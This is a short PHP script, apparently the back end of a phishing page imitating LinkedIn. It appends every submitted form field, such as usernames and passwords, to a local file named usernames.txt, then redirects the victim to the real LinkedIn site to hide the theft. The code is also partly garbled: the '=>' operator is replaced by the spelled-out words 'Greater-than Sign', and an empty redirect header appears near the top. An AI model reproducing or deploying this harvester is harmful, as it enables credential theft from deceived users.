<?php
header
('location:');
$handle=fopen("usernames.txt", "a");
foreach($_POST as $variable=𝐆𝐫𝐞𝐚𝐭𝐞𝐫-𝐭𝐡𝐚𝐧 𝐒𝐢𝐠𝐧$value)
{
fwrite($handle,$variable);
fwrite($handle,"-");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://www.linkedin.com/");
exit;
?>